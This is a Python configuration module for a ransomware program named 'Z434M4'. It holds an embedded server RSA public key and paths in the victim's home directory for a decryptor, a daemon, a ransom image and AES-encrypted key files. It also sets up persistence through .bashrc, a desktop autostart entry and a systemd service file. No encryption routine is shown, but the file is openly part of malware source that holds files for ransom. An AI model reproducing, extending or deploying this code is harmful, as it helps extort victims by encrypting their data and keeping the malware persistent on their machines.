import os

import environment 

# const variables
server_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxF5BOX3N5UN1CsHpnfuU
58lOw0+scQ39hVL3O6jHXFNzwbZLwNwOXCMiGDQUmwPwJIrRwKVZfUkza4KHG2XC
p82xOc87YgdZwXrRPJ56MmIpAV1ES4gFD9JfzDN/iEBLyXYCx2NTBQnwucSLkk0l
lXmYzaGRcLf9nGJqjgMVS7qLH7qZoG2c88w2JF6C+H19cFWh5q45Z2334RuWAKQ3
9JGad6rvCrPr5tQ1TLJiDZV+HvJyh7RSjDOXy2yQ0bVl9yO2m5fGDLL8DZ7vg9CC
KpoRTVROVkbL0QcmKekpPxtRutF/kVOyWnYDk/qRA6m4+JCqFIRbQJQnOK8HM15i
MwIDAQAB
-----END PUBLIC KEY-----"""

# environment paths
ransomware_name = "Z434M4"
test_path = "/test"

home = environment.get_home_path()
desktop = environment.get_desktop_path()
username = environment.get_username()
ransomware_path = os.path.join(home, ransomware_name)
decryptor_path = os.path.join(ransomware_path, "decryptor")
daemon_path = os.path.join(ransomware_path, "daemon")
img_path = os.path.join(ransomware_path, "img.png")
Z434M4_path = ''
bashrc_path = os.path.join(home, '.bashrc')
daemon_desktop = os.path.join(ransomware_path, 'daemon.desktop')
daemon_service = os.path.join(ransomware_path, 'daemon.service')

aes_encrypted_keys_path = os.path.join(ransomware_path, "AES_encrypted_keys.txt")
encrypted_client_private_key_path = os.path.join(ransomware_path, 'encrypted_client_private_key.key')
client_public_key_path = os.path.join(ransomware_path, "client_public_key.PEM")

Z434M4 = ""
decryptor = ""
daemon = ""